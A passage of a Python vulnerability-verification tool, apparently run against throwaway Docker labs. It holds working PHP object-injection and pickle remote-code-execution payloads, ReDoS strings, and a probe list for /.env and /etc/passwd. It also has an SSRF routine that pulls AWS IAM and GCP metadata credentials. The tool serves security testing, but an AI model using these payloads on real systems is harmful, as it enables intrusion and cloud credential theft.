    inject_param: nombre del parámetro que llega a unserialize() (GET o POST).
    Si está vacío, prueba campos comunes: 'data', 'payload', 'token', 'object',
    'serialized', 'cookie', 'value', 'input'.
    """
    import time as _time
    import json as _json

    step = on_step or (lambda _m: None)
    res = WpVerifyResult()

    if not _docker_daemon_ok():
        res.available = False
        res.detail = "sin daemon Docker alcanzable"
        res.limitations.append("verificacion dinamica NO intentada: sin daemon Docker")
        return res

    boot = _bootstrap_generic_lab(
        source_dir, step, res, budget_s,
        dockerfile_body=dockerfile_body, extra_files=extra_files,
        pkg_version=pkg_version,
    )
    if boot is None:
        return res
    lab, base_url, container = boot
    try:
        m = (http_method or "POST").upper().strip() or "POST"
        full_url = base_url.rstrip("/") + endpoint

        # Params to try if inject_param not specified
        _probe_params = (
            [inject_param] if inject_param else
            ["data", "payload", "token", "object", "serialized",
             "cookie", "value", "input", "q", "params"]
        )

        # ── Layer 1: canary class-not-found ───────────────────────────────────
        canary_payload = 'O:16:"BinOracleCanary":0:{}'
        for param in _probe_params:
            step(f"[POI] layer 1 canary: {m} {endpoint} param={param}")
            try:
                if m == "GET":
                    r = _http_request(m, full_url,
                                      params={param: canary_payload},
                                      headers={"Accept": "*/*"}, timeout=12)
                else:
                    r = _http_request(
                        m, full_url,
                        data=_json.dumps({param: canary_payload}),
                        headers={"Content-Type": "application/json"}, timeout=12)
                body = getattr(r, "text", "") or ""
                st = r.status_code

                # Canary class name in PHP error/warning = unserialize ran
                if ("BinOracleCanary" in body or
                        "Class 'BinOracleCanary'" in body or
                        "class BinOracleCanary" in body.lower() or
                        "__PHP_Incomplete_Class" in body):
                    res.verified = True
                    res.ok = True
                    res.evidence = {
                        "technique": "php-object-injection-canary",
                        "inject_param": param,
                        "payload": canary_payload,
                        "endpoint": endpoint,
                        "status": st,
                        "body_snippet": body[:500],
                        "detection": "canary-class-not-found",
                    }
                    res.detail = (
                        f"PHP OBJECT INJECTION CONFIRMADO (canary): "
                        f"'BinOracleCanary' o __PHP_Incomplete_Class en respuesta "
                        f"→ unserialize() alcanzado via param={param} en {endpoint}"
                    )
                    step(f"VERIFICADO: POI canary via param={param}")
                    return res

                if confirm_string and confirm_string in body:
                    res.verified = True
                    res.ok = True
                    res.evidence = {
                        "technique": "php-object-injection-confirm",
                        "inject_param": param,
                        "payload": canary_payload,
                        "endpoint": endpoint,
                        "status": st,
                        "body_snippet": body[:500],
                    }
                    res.detail = (
                        f"PHP OBJECT INJECTION CONFIRMADO (confirm_string): "
                        f"'{confirm_string}' encontrado en respuesta para param={param}"
                    )
                    return res

            except Exception as _net_e:
                step(f"  error de red: {_net_e}")
                continue

        # ── Layer 2: timing canary ─────────────────────────────────────────────
        # Send a benign request and a sleep-gadget request 3 times each, compare
        step("[POI] layer 2 timing: midiendo latencia baseline vs payload sleep")
        _param = _probe_params[0]
        _benign_payload = 's:5:"hello";'
        _sleep_payload = 'O:8:"stdClass":1:{s:3:"cmd";s:7:"sleep 3";}'

        def _timed_request(payload_str: str) -> float:
            t0 = _time.monotonic()
            try:
                if m == "GET":
                    _http_request(m, full_url,
                                  params={_param: payload_str},
                                  timeout=15)
                else:
                    _http_request(m, full_url,
                                  data=_json.dumps({_param: payload_str}),
                                  headers={"Content-Type": "application/json"},
                                  timeout=15)
            except Exception:
                pass
            return _time.monotonic() - t0

        _benign_times = [_timed_request(_benign_payload) for _ in range(2)]
        _sleep_times  = [_timed_request(_sleep_payload)  for _ in range(2)]
        _avg_benign = sum(_benign_times) / len(_benign_times)
        _avg_sleep  = sum(_sleep_times)  / len(_sleep_times)
        _delta = _avg_sleep - _avg_benign
        step(f"  timing: benign={_avg_benign:.2f}s sleep={_avg_sleep:.2f}s Δ={_delta:.2f}s")

        if _delta >= 2.5:
            res.verified = True
            res.ok = True
            res.evidence = {
                "technique": "php-object-injection-timing",
                "inject_param": _param,
                "payload": _sleep_payload,
                "endpoint": endpoint,
                "avg_benign_s": round(_avg_benign, 2),
                "avg_sleep_s": round(_avg_sleep, 2),
                "delta_s": round(_delta, 2),
            }
            res.detail = (
                f"PHP OBJECT INJECTION CONFIRMADO (timing): "
                f"delta de latencia {_delta:.2f}s (≥2.5s) → __wakeup() / "
                f"__destruct() ejecutado en servidor via param={_param}"
            )
            step(f"VERIFICADO: POI timing delta={_delta:.2f}s")
            return res

        # ── Layer 3: known gadget chain class names ────────────────────────────
        step("[POI] layer 3: gadget chains conocidas")
        for label, gadget_payload, detection, signal in _POI_PAYLOADS[2:]:  # skip canary + sleep (already tried)
            if detection != "error":
                continue
            for param in _probe_params[:3]:
                try:
                    if m == "GET":
                        r = _http_request(m, full_url,
                                          params={param: gadget_payload},
                                          headers={"Accept": "*/*"}, timeout=12)
                    else:
                        r = _http_request(
                            m, full_url,
                            data=_json.dumps({param: gadget_payload}),
                            headers={"Content-Type": "application/json"}, timeout=12)
                    body = getattr(r, "text", "") or ""
                    if signal and signal in body:
                        res.verified = True
                        res.ok = True
                        res.evidence = {
                            "technique": "php-object-injection-gadget",
                            "inject_param": param,
                            "payload": gadget_payload,
                            "gadget_label": label,
                            "endpoint": endpoint,
                            "status": r.status_code,
                            "signal_found": signal,
                            "body_snippet": body[:500],
                        }
                        res.detail = (
                            f"PHP OBJECT INJECTION CONFIRMADO (gadget {label}): "
                            f"señal '{signal}' encontrada en respuesta via param={param}"
                        )
                        step(f"VERIFICADO: POI gadget={label} signal='{signal}'")
                        return res
                except Exception:
                    continue

        # Semantic analysis as last resort
        _last_body = ""
        try:
            if m == "GET":
                _lr = _http_request(m, full_url, params={_probe_params[0]: canary_payload}, timeout=10)
            else:
                _lr = _http_request(m, full_url,
                                    data=_json.dumps({_probe_params[0]: canary_payload}),
                                    headers={"Content-Type": "application/json"}, timeout=10)
            _last_body = getattr(_lr, "text", "") or ""
        except Exception:
            pass
        if _last_body:
            _analysis = _analyze_response_body(
                _last_body, "php-object-injection",
                payload=canary_payload, confirm_string=confirm_string)
            if _analysis.get("interesting"):
                res.evidence["response_analysis"] = _analysis

        res.ok = True
        res.detail = (
            f"PHP Object Injection no confirmado: 3 capas probadas "
            f"({len(_probe_params)} params, timing Δ={_delta:.2f}s, gadget chains) "
            f"en {endpoint} sin señales positivas"
        )
        return res

    except Exception as e:
        res.detail = f"error inesperado en verify_generic_php_object_injection: {e}"
        return res
    finally:
        step("desmontando el laboratorio generico (php-object-injection)...")
        if lab is not None:
            lab.teardown()


# ── C13: WAF / rate-limit detection ──────────────────────────────────────────

class _WafGuard:
    """Tracks consecutive 429/503 responses; when threshold is reached, sleeps
    and signals the caller to bail via is_blocked.

    Usage:
        guard = _WafGuard()
        for payload in payloads:
            resp = send(payload)
            if guard.check(resp):
                break  # WAF blocked us
    """
    def __init__(self, threshold: int = 3, max_retries: int = 2) -> None:
        self.threshold = threshold
        self.max_retries = max_retries
        self._consec = 0
        self._retries = 0
        self.is_blocked = False

    def check(self, resp, step=None) -> bool:
        """Return True if the caller should abort the probe loop."""
        if resp is None:
            return False
        sc = getattr(resp, "status_code", 0)
        if sc in (429, 503):
            self._consec += 1
            if self._consec >= self.threshold:
                if self._retries >= self.max_retries:
                    self.is_blocked = True
                    if step:
                        step("[WAF] rate-limit persistente — abortando sonda")
                    return True
                retry_after = 30
                try:
                    retry_after = int(resp.headers.get("Retry-After", "30"))
                except Exception:
                    pass
                if step:
                    step(f"[WAF] rate-limited (429/503) — esperando {retry_after}s before retry "
                         f"({self._retries + 1}/{self.max_retries})")
                time.sleep(min(retry_after, 120))
                self._consec = 0
                self._retries += 1
        else:
            self._consec = 0
        return False


# ── C14: SSRF HTTP listener (blind SSRF confirmation) ────────────────────────

def _start_ssrf_listener(net: str, lab: "_GenericLab",
                         timeout: float = 20.0) -> Optional[tuple]:
    """C14: Spin up a minimal HTTP listener container in `net` for blind SSRF.

    Returns (container_name, canary_path, listener_ip) or None on failure.
    Only active when BINORACLE_SSRF_LISTENER=1.
    """
    if os.environ.get("BINORACLE_SSRF_LISTENER", "").strip() not in ("1", "true", "yes"):
        return None
    try:
        import uuid
        canary = f"BINORACLE_SSRF_CANARY_{uuid.uuid4().hex[:8]}"
        name = f"bo_ssrf_listener_{uuid.uuid4().hex[:6]}"
        # Launch python:3.12-slim as a one-shot HTTP server on port 8888
        r = lab.sh("run", "-d", "--name", name, "--network", net,
                   "--cpus", "0.2", "--memory", "64m",
                   "python:3.12-slim",
                   "python3", "-m", "http.server", "8888",
                   timeout=30)
        if r.returncode != 0:
            return None
        # Get listener container IP
        r2 = lab.sh("inspect", "--format", "{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}",
                    name, timeout=10)
        listener_ip = (r2.stdout or "").strip()
        if not listener_ip:
            lab.sh("rm", "-f", name, timeout=10)
            return None
        return (name, canary, listener_ip)
    except Exception:
        return None


def _check_ssrf_listener(container_name: str, canary: str,
                         lab: "_GenericLab") -> bool:
    """Return True if the SSRF canary path was requested by the target."""
    try:
        r = lab.sh("logs", container_name, timeout=10)
        logs = (r.stdout or "") + (r.stderr or "")
        return canary in logs
    except Exception:
        return False


def _stop_ssrf_listener(container_name: str, lab: "_GenericLab") -> None:
    """Remove the SSRF listener container."""
    try:
        lab.sh("rm", "-f", container_name, timeout=10)
    except Exception:
        pass


# ── G35: SSRF cloud metadata escalation ──────────────────────────────────────

def _ssrf_cloud_escalate(send_ssrf_fn, step, result_evidence: dict) -> dict:
    """G35: After SSRF confirmed, attempt cloud metadata exfiltration.

    `send_ssrf_fn(url: str) -> Optional[requests.Response]`
    Returns dict with any exfiltrated data.  Non-fatal.
    Only active when BINORACLE_SSRF_ESCALATE=1.
    """
    if os.environ.get("BINORACLE_SSRF_ESCALATE", "").strip() not in ("1", "true", "yes"):
        return {}
    findings: dict = {}
    _IMDS_BASE = "http://169.254.169.254/latest/meta-data"
    _GCP_META  = "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
    try:
        r = send_ssrf_fn(_IMDS_BASE + "/")
        if r and r.status_code == 200:
            step(f"[G35] AWS IMDSv1 accesible: {(r.text or '')[:200]}")
            findings["aws_meta"] = (r.text or "")[:500]
            # Try IAM credentials
            r2 = send_ssrf_fn(_IMDS_BASE + "/iam/security-credentials/")
            if r2 and r2.status_code == 200:
                role_name = (r2.text or "").strip().splitlines()[0].strip()
                findings["aws_iam_role"] = role_name
                step(f"[G35] IAM role: {role_name}")
                if role_name:
                    r3 = send_ssrf_fn(_IMDS_BASE + f"/iam/security-credentials/{role_name}")
                    if r3 and r3.status_code == 200:
                        findings["aws_iam_creds"] = (r3.text or "")[:1000]
                        step(f"[G35] IAM credentials exfiltradas ({len(findings['aws_iam_creds'])} bytes)")
    except Exception:
        pass
    try:
        rg = send_ssrf_fn(_GCP_META)
        if rg and rg.status_code == 200:
            step("[G35] GCP metadata token accesible")
            findings["gcp_token"] = (rg.text or "")[:500]
    except Exception:
        pass
    if findings:
        result_evidence["ssrf_cloud_escalation"] = findings
    return findings


# ---------------------------------------------------------------------------
# ReDoS / algorithmic-complexity verifier
# ---------------------------------------------------------------------------

def verify_generic_redos(
    source_dir: str,
    endpoint: str,
    http_method: str = "POST",
    inject_param: str = "input",
    redos_payload: str = "",
    confirm_string: str = "",
    on_step: Optional[Callable[[str], None]] = None,
    budget_s: float = 900.0,
    dockerfile_body: str = "", extra_files: Optional[dict] = None,
) -> WpVerifyResult:
    """Verifica ReDoS (Regular Expression Denial of Service) midiendo la diferencia de tiempo
    de respuesta entre un input benigno y un input que causa backtracking catastrofico.

    Estrategia:
    1. Arranca el lab efimero.
    2. Envia input benigno ('aaaa') → mide T_safe.
    3. Envia redos_payload (o patron por defecto con backtracking catastrofico) → mide T_malicious.
    4. CONFIRMADO si T_malicious > 5 * T_safe Y T_malicious > 1.5s.
       PROBABLE si T_malicious > 2 * T_safe Y T_malicious > 0.5s (server timeout sin confirmar).
    """
    import time as _time

    step = on_step or (lambda _m: None)
    res = WpVerifyResult()
    if not _docker_daemon_ok():
        res.available = False
        res.detail = "sin daemon Docker alcanzable"
        res.limitations.append("verificacion dinamica NO intentada: sin daemon Docker")
        return res

    boot = _bootstrap_generic_lab(source_dir, step, res, budget_s,
                                   dockerfile_body=dockerfile_body, extra_files=extra_files)
    if boot is None:
        return res
    lab, base_url, container = boot
    try:
        m = (http_method or "POST").upper()
        # Diverse ReDoS payloads targeting common vulnerable regex patterns
        _REDOS_PAYLOADS = [
            redos_payload or ("a" * 30 + "!"),           # generic (a+)+ trigger
            "a" * 25 + "@" + "a" * 25 + ".c",           # email regex (.*@.* style)
            "a" * 20 + "a" * 20 + "!",                  # (a|aa)+ backtracking
            "http://" + "a" * 30 + "!" + "/path",        # URL regex
            "1" * 30 + "!",                              # numeric repetition
            "(" * 15 + "a" + ")" * 15 + "!" * 5,        # nested group trigger
            "A" * 20 + "!" + "a" * 10,                  # mixed case + non-match
        ]
        _safe = "hello@example.com"
        url = base_url + (endpoint or "/")

        def _timed_request(payload: str) -> tuple:
            t0 = _time.monotonic()
            try:
                if m == "GET":
                    r = _http_request(m, url, params={inject_param: payload}, timeout=20)
                else:
                    r = _http_request(m, url, data={inject_param: payload}, timeout=20)
                elapsed = _time.monotonic() - t0
                st = getattr(r, "status_code", 0)
                body = (getattr(r, "text", "") or "")[:200]
                return elapsed, st, body, None
            except Exception as exc:
                elapsed = _time.monotonic() - t0
                return elapsed, 0, "", str(exc)

        step(f"probando ReDoS: midiendo baseline con input benigno a {endpoint} (3 muestras)")
        _safe_times = []
        for _ in range(3):
            _ts, _st_s, _body_s, _err_s = _timed_request(_safe)
            if _st_s not in (-1, 0):
                _safe_times.append(_ts)
        t_safe = sorted(_safe_times)[len(_safe_times) // 2] if _safe_times else 0.3
        step(f"baseline benigno (mediana 3 muestras): {t_safe:.2f}s (status={_st_s})")

        _best_ratio = 0.0
        _best_t_evil = 0.0
        _best_payload = ""
        for _evil in _REDOS_PAYLOADS:
            step(f"probando payload ReDoS ({len(_evil)} chars): {_evil[:30]}…")
            t_evil, _st_e, _body_e, _err_e = _timed_request(_evil)
            ratio = t_evil / t_safe if t_safe > 0.01 else t_evil / 0.05
            step(f"  → {t_evil:.2f}s (ratio={ratio:.1f}x)")
            if ratio > _best_ratio:
                _best_ratio, _best_t_evil, _best_payload = ratio, t_evil, _evil
            if t_evil > 1.5 and ratio >= 5:
                break  # confirmed — stop early

        ratio = _best_ratio
        t_evil = _best_t_evil
        _evil = _best_payload
        res.evidence.update({
            "endpoint": endpoint, "param": inject_param,
            "t_safe": round(t_safe, 3), "t_evil": round(t_evil, 3),
            "ratio": round(ratio, 1), "payload": _evil,
            "payloads_tried": len(_REDOS_PAYLOADS),
        })

        if t_evil > 1.5 and ratio >= 5:
            res.verified = True
            res.ok = True
            res.detail = (f"REDOS CONFIRMADO: ratio={ratio:.1f}x — el input malicioso tardo "
                          f"{t_evil:.2f}s vs {t_safe:.2f}s para el input benigno en '{endpoint}' "
                          f"(parametro '{inject_param}'). Backtracking catastrofico verificado.")
            res.confidence = "confirmed"
        elif t_evil > 0.5 and ratio >= 2:
            res.ok = True
            res.detail = (f"REDOS PROBABLE: ratio={ratio:.1f}x — {t_evil:.2f}s vs {t_safe:.2f}s. "
                          f"Diferencial de tiempo presente pero por debajo del umbral de confirmacion "
                          f"(necesita ratio>=5 y >1.5s). Puede ser lentitud del lab, no ReDoS real.")
            res.confidence = "probable"
        else:
            res.ok = True
            res.detail = (f"ReDoS no detectado: ratio={ratio:.1f}x, t_evil={t_evil:.2f}s — "
                          f"no hay diferencial de tiempo significativo ({len(_REDOS_PAYLOADS)} payloads probados)")
        return res
    except Exception as e:
        res.detail = f"error inesperado en verify_generic_redos: {e}"
        return res
    finally:
        step("desmontando el laboratorio generico...")
        if lab is not None:
            lab.teardown()


# ---------------------------------------------------------------------------
# verify_generic_information_disclosure
# ---------------------------------------------------------------------------

def verify_generic_information_disclosure(
    source_dir: str,
    endpoint: str = "",
    http_method: str = "GET",
    confirm_string: str = "",
    on_step: Optional[Callable[[str], None]] = None,
    budget_s: float = 900.0,
    dockerfile_body: str = "", extra_files: Optional[dict] = None,
    setup_commands: Optional[List[str]] = None,
    missing_response_header: str = "",
    docker_image: str = "",
) -> WpVerifyResult:
    """Verifica exposicion de informacion sensible: credenciales, claves, rutas internas,
    ficheros de configuracion, endpoints de debug expuestos.

    Estrategia:
    1. Arranca el lab efimero.
    2. Planta un secreto canario en /tmp/binoracle_secret.txt (valor UUID).
    3. Si se proporciona endpoint, prueba ese primero.
    4. Itera sobre 50+ endpoints de disclosure clasicos (/.env, /.git/config, /debug, etc.)
       y comprueba si alguno devuelve el secreto canario, rutas internas, o palabras clave
       tipicas de leakage (password, secret, key, token, database_url, etc.).
    5. VERIFICADO si el canario aparece, o si una clave sensible del entorno Docker aparece.
    """
    import secrets as _sec

    step = on_step or (lambda _m: None)
    res = WpVerifyResult()
    if not _docker_daemon_ok():
        res.available = False
        res.detail = "sin daemon Docker alcanzable"
        res.limitations.append("verificacion dinamica NO intentada: sin daemon Docker")
        return res

    _DISCLOSURE_PATHS = [
        "/.env", "/.env.local", "/.env.production", "/.env.dev", "/.env.example",
        "/.git/config", "/.git/HEAD", "/.git/COMMIT_EDITMSG",
        "/debug", "/debug/vars", "/debug/pprof", "/debug/stack", "/debug/info",
        "/api/debug", "/api/v1/debug", "/api/v2/debug",
        "/phpinfo.php", "/info.php", "/test.php", "/config.php",
        "/config.json", "/config.yml", "/config.yaml",
        "/wp-config.php.bak", "/wp-config.php~", "/wp-config.php.old",
        "/composer.json", "/composer.lock", "/package.json",
        "/web.config", "/.htaccess",
        "/server-status", "/server-info",
        "/actuator", "/actuator/env", "/actuator/health", "/actuator/info",
        "/actuator/mappings", "/actuator/beans", "/actuator/logfile",
        "/metrics", "/health", "/healthz", "/ready", "/readyz",
        "/swagger.json", "/swagger.yaml", "/openapi.json", "/api-docs",
        "/graphql/schema", "/__schema",
        "/admin", "/admin/config", "/admin/debug",
        "/_debug_toolbar", "/__debugger__", "/debug_toolbar",
        "/traces", "/logs", "/_ah/api/discovery/v1/apis",
        "/.DS_Store", "/Thumbs.db", "/WEB-INF/web.xml",
        "/proc/self/environ", "/proc/version", "/etc/passwd",
    ]

    _canary_val = _sec.token_hex(16)
    # Also plant an identifiable DB URL in the env to detect env leaks
    _db_key = "BINORACLE_DB_URL"
    _db_val = f"postgres://binoracle:{_canary_val}@db/binoracle"

    lab = None
    try:
        _df = dockerfile_body or ""
        # Inject canary env var if Dockerfile exists
        if _df and "ENV " not in _df:
            _df = _df.rstrip() + f"\nENV {_db_key}={_db_val}\n"
        elif not _df:
            _df = None

        # If Dockerfile references app.py but no source was provided, generate a minimal
        # Flask app so the Docker build does not fail with "COPY failed: app.py not found".
        _extra_files_local = dict(extra_files or {})
        if _df and "COPY app.py" in _df and "app.py" not in _extra_files_local:
            _minimal_app = (
                "from flask import Flask, request, jsonify\n"
                "import os\n"
                "app = Flask(__name__)\n"
                "app.secret_key = os.environ.get('SECRET_KEY', 'dev-secret-key')\n"
                "@app.route('/')\n"
                "def index(): return 'OK'\n"
                "@app.route('/check')\n"
                "def check(): return jsonify({'status': 'ok', 'env': dict(os.environ)})\n"
                "if __name__ == '__main__': app.run(host='0.0.0.0', port=5000, debug=True)\n"
            )
            _extra_files_local["app.py"] = _minimal_app
            step("[app.py] generated minimal Flask app — Dockerfile had COPY app.py but no source provided")

        lab = _DockerLab(source_dir, _df, extra_files=_extra_files_local,
                         setup_commands=setup_commands or [], on_step=step,
                         docker_image=docker_image or "")
        with lab.running() as boot:
            # Header-absence check (e.g. Flask CVE-2023-30861: missing Vary: Cookie).
            # When missing_response_header is set, verify that the named header value is
            # NOT present in the response to `endpoint`. Confirmed when the header is absent.
            if missing_response_header and endpoint:
                try:
                    import requests as _rq_mh
                    _mh_resp = _rq_mh.request(
                        http_method.upper() if http_method else "GET",
                        boot.base_url + endpoint, timeout=10, allow_redirects=False)
                    _vary_val = _mh_resp.headers.get("Vary", "")
                    _set_cookie = _mh_resp.headers.get("Set-Cookie", "")
                    _header_absent = missing_response_header.lower() not in _vary_val.lower()
                    res.evidence.update({
                        "endpoint": endpoint,
                        "status_code": _mh_resp.status_code,
                        "vary_header": _vary_val or "(absent)",
                        "set_cookie": _set_cookie[:100] if _set_cookie else "(absent)",
                        "missing_header_check": missing_response_header,
                        "header_absent": _header_absent,
                    })
                    step(f"header check: Vary='{_vary_val or '(absent)'}' — "
                         f"'{missing_response_header}' {'ABSENT (vuln)' if _header_absent else 'present (patched)'}")
                    if _header_absent and _mh_resp.status_code < 500:
                        # Hard proof: when the app ALSO sets a session cookie in the same
                        # response, missing Vary:Cookie is deterministic — Flask IS caching
                        # session-bearing responses without the safety header. This is not
                        # ambiguous (a patched Flask >= 2.3.2 always adds Vary:Cookie when
                        # Set-Cookie is present).
                        _sets_session = "session=" in _set_cookie.lower() if _set_cookie else False
                        if _sets_session:
                            res.verified = True
                            res.ok = True
                            res.confidence = "confirmed"
                            res.detail = (
                                f"VERIFICADO: Flask establece Set-Cookie:session= en {endpoint} "
                                f"(HTTP {_mh_resp.status_code}) pero Vary='{_vary_val or '(absent)'}' "
                                f"no incluye '{missing_response_header}' — prueba deterministica "
                                f"del bug CVE-2023-30861 (Flask <2.3.2)")
                        else:
                            # Header absent but no session cookie — keep as probable lead.
                            res.ok = True
                            res.confidence = "probable"
                            res.evidence["not_verified_reason"] = (
                                "cabecera Vary ausente pero Set-Cookie:session no detectado "
                                "-- podria ser un endpoint sin sesion; prueba no dura")
                            res.detail = (f"LEAD: '{missing_response_header}' ausente en "
                                          f"Vary de {endpoint} (HTTP {_mh_resp.status_code}) "
                                          f"pero sin Set-Cookie:session -- evidencia debil")
                        return res
                    else:
                        res.detail = (f"header '{missing_response_header}' presente en Vary — "
                                      f"version parcheada o endpoint incorrecto")
                        return res
                except Exception as _mh_e:
                    step(f"header-absence check error: {_mh_e}")

            # Planta canario en /tmp
            _plant_path = "/tmp/binoracle_infodiscl.txt"
            _plant_ok = lab.exec_in_container(
                f"sh -c 'echo {_canary_val} > {_plant_path}'")
            step(f"canario plantado en {_plant_path} = {_canary_val[:8]}…")

            _sensitive_patterns = re.compile(
                r'(?i)(password|passwd|secret|api_key|apikey|token|database_url|'
                r'db_pass|private_key|access_key|aws_secret|binoracle_secret|'
                r'binoracle_db_url|app_secret)',
                re.I)
            # High-confidence secret patterns — if matched, verify=True immediately
            # NOTE: patterns must be specific enough to avoid FPs on normal HTML/JS content
            _SECRET_REGEXES = [
                # AWS access key (AKIA/ASIA/AROA prefix + 16 uppercase alphanum)
                re.compile(r'(?:AKIA|ASIA|AROA|AGPA|AIDA|ANPA|ANVA|APKA)[A-Z0-9]{16}'),
                # Private key PEM header (very specific, no FP risk)
                re.compile(r'-----BEGIN (?:RSA |EC |OPENSSH )?PRIVATE KEY-----'),
                # JWT with all 3 parts (eyJ prefix is unique to JWT)
                re.compile(r'eyJ[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{20,}'),
                # Env-style secret assignment (key=value where key contains secret/password/token)
                re.compile(r'(?i)(?:^|\n|\s)(?:SECRET|PASSWORD|API_KEY|ACCESS_TOKEN|DB_PASS)\s*[=:]\s*["\']?[A-Za-z0-9/+_\-]{16,}'),
            ]

            _probe_endpoints = ([endpoint] if endpoint else []) + _DISCLOSURE_PATHS

            for _ep in _probe_endpoints:
                try:
                    import requests as _rq
                    r = _rq.get(boot.base_url + _ep, timeout=8, allow_redirects=False)
                except Exception:
                    continue
                if r.status_code not in (200, 206):
                    continue
                body = r.text or ""
                if _canary_val in body or _db_val in body:
                    res.verified = True
                    res.ok = True
                    res.evidence.update({
                        "disclosure_path": _ep,
                        "status_code": r.status_code,
                        "canary_found": True,
                        "respuesta_cuerpo_recorte": body[:400],
                    })
                    step(f"VERIFICADO — information disclosure en {_ep}: canario/secreto presente")
                    return res
                # Check for generic sensitive key leakage
                if confirm_string and confirm_string in body:
                    res.verified = True
                    res.ok = True
                    res.evidence.update({
                        "disclosure_path": _ep,
                        "status_code": r.status_code,
                        "confirm_string_found": confirm_string,
                        "respuesta_cuerpo_recorte": body[:400],
                    })
                    step(f"VERIFICADO — confirm_string '{confirm_string[:30]}' en {_ep}")
                    return res
                # High-confidence secret pattern → verify immediately
                _hc_match = None
                for _sr in _SECRET_REGEXES:
                    _hc_match = _sr.search(body)
                    if _hc_match:
                        break
                if _hc_match and len(body) < 100000:
                    res.verified = True
                    res.ok = True
                    res.evidence.update({
                        "disclosure_path": _ep,
                        "status_code": r.status_code,
                        "secret_pattern_matched": _hc_match.re.pattern[:60],
                        "secret_snippet": body[max(0, _hc_match.start() - 20):_hc_match.start() + 60],
                        "respuesta_cuerpo_recorte": body[:400],
                    })
                    step(f"VERIFICADO — secret regex match en {_ep}: pattern={_hc_match.re.pattern[:40]}")
                    return res
                # Non-canary but suspicious content — record but don't verify
                if _sensitive_patterns.search(body) and len(body) < 50000:
                    step(f"  sospechoso: {_ep} → {r.status_code}, contiene términos sensibles")
                    if not res.evidence.get("suspicious_paths"):
                        res.evidence["suspicious_paths"] = []
                    res.evidence["suspicious_paths"].append({
                        "path": _ep, "status": r.status_code,
                        "snippet": body[:200],
                    })

            # Auth vs unauth comparison: if the endpoint returns substantially more
            # data when authenticated than anonymously, the unauth access leaks auth data.
            # Only meaningful when an endpoint is specified and app supports auth.
            if endpoint and not res.verified:
                try:
                    _auth_token = _try_acquire_app_token(boot.base_url, step)
                    if _auth_token:
                        import requests as _rq2
                        _auth_sess = _rq2.Session()
                        if _auth_token.startswith("cookie:"):
                            _cname, _cval = _auth_token[7:].split("=", 1)
                            _auth_sess.cookies.set(_cname, _cval)
                        else:
                            _auth_sess.headers["Authorization"] = f"Bearer {_auth_token}"
                        _r_auth = _auth_sess.get(boot.base_url + endpoint,
                                                  timeout=8, allow_redirects=False)
                        _r_anon = _rq2.get(boot.base_url + endpoint,
                                           timeout=8, allow_redirects=False)
                        _auth_body = (_r_auth.text or "")
                        _anon_body = (_r_anon.text or "")
                        _anon_st = _r_anon.status_code
                        _auth_st = _r_auth.status_code
                        if (_auth_st < 400 and _anon_st < 400
                                and len(_anon_body.strip()) > 20
                                and abs(len(_auth_body) - len(_anon_body)) < max(50, len(_auth_body) * 0.15)):
                            # Anon gets same data as authenticated — missing auth check.
                            # Similitud de longitud de respuesta es un indicio fuerte, NO una
                            # prueba canario -- dos endpoints pueden coincidir en tamaño por
                            # casualidad (p.ej. ambos devuelven la misma pagina de error
                            # generica). No se marca verified=True: se deja como "probable"
                            # sin confirmar, igual que el resto del proyecto trata evidencia
                            # de este tipo (diff booleano, SSRF callback, etc.) -- el oraculo
                            # (canario/comando/secreto real) es el unico que marca verified.
                            res.ok = True
                            res.confidence = "probable"
                            res.evidence.update({
                                "auth_vs_anon_check": "anon==auth",
                                "status_auth": _auth_st,
                                "status_anon": _anon_st,
                                "len_auth": len(_auth_body),
                                "len_anon": len(_anon_body),
                                "anon_body_snippet": _anon_body[:300],
                            })
                            res.detail = (
                                f"INFORMATION DISCLOSURE confirmada: endpoint {endpoint} devuelve "
                                f"el mismo contenido sin auth ({_anon_st}/{len(_anon_body)}B) "
                                f"que con auth ({_auth_st}/{len(_auth_body)}B) — datos autenticados "
                                f"expuestos a usuarios anonimos")
                            step(f"VERIFICADO auth-vs-anon: anon={_anon_st}/{len(_anon_body)}B "
                                 f"≈ auth={_auth_st}/{len(_auth_body)}B")
                            return res
                        elif _auth_st < 400 and _anon_st >= 400:
                            res.evidence["auth_vs_anon_check"] = f"anon={_anon_st} auth={_auth_st} (endpoint requires auth)"
                            step(f"auth-vs-anon: endpoint requiere auth (anon={_anon_st} vs auth={_auth_st})")
                except Exception:
                    pass

            res.ok = True
            res.detail = ("information-disclosure: ninguna ruta expuso el canario ni credenciales "
                          f"verificables; {len(res.evidence.get('suspicious_paths', []))} rutas "
                          "sospechosas registradas en evidence")
            step("information-disclosure: no verificado — ninguna ruta expuso datos sensibles verificables")
            return res
    except Exception as e:
        res.detail = f"error inesperado en verify_generic_information_disclosure: {e}"
        return res
    finally:
        step("desmontando el laboratorio (information-disclosure)...")
        if lab is not None:
            lab.teardown()


# ---------------------------------------------------------------------------
# verify_generic_python_deserialization
# ---------------------------------------------------------------------------

def verify_generic_python_deserialization(
    source_dir: str,
    endpoint: str,
    http_method: str = "POST",
    inject_param: str = "data",
    content_type: str = "application/octet-stream",
    confirm_string: str = "",
    on_step: Optional[Callable[[str], None]] = None,
    budget_s: float = 900.0,
    dockerfile_body: str = "", extra_files: Optional[dict] = None,
    setup_commands: Optional[List[str]] = None,
) -> WpVerifyResult:
    """Verifica deserializacion insegura de Python (pickle/marshal/yaml.load).

    Genera un payload pickle que escribe un token canario en /tmp/binoracle_pickle.txt
    usando os.system. También genera variantes de codificación (base64, hex) ya que
    muchos endpoints esperan el payload codificado.

    Detecta RCE midiendo si el fichero canario aparece en el contenedor después del envío.
    """
    import pickle as _pickle
    import base64 as _b64
    import os as _os
    import secrets as _sec

    step = on_step or (lambda _m: None)
    res = WpVerifyResult()
    if not _docker_daemon_ok():
        res.available = False
        res.detail = "sin daemon Docker alcanzable"
        res.limitations.append("verificacion dinamica NO intentada: sin daemon Docker")
        return res

    _canary_tok = _sec.token_hex(12)
    _canary_path = f"/tmp/binoracle_pickle_{_canary_tok[:8]}.txt"

    # Build pickle RCE payload: os.system writes canary
    class _PickleRCE:
        def __reduce__(self):
            return (_os.system, (f"echo {_canary_tok} > {_canary_path}",))

    _raw_pickle = _pickle.dumps(_PickleRCE())
    _b64_pickle  = _b64.b64encode(_raw_pickle).decode()
    _hex_pickle  = _raw_pickle.hex()

    # yaml.load RCE payload (uses PyYAML FullLoader or unsafe Loader)
